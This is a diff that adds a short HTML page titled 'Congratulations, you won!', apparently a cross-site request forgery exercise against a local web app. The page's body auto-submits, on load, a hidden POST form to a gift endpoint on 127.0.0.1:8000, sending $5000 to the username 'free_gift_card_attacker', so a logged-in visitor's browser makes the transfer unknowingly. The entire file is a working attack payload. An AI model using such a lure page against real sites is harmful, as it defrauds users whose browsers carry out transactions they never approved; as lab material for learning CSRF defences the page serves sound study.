@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title>Congratulations, you won!</title>
+    </head>
+
+    <body onload ="document.forms[0].submit()">
+        <form action="http://127.0.0.1:8000/gift.html" method="POST">
+            <input type="hidden" name="username" value="free_gift_card_attacker"/>
+            <input type="hidden" name="amount" value="$5000"/>
+        </form>
+    </body>
+
+</html>
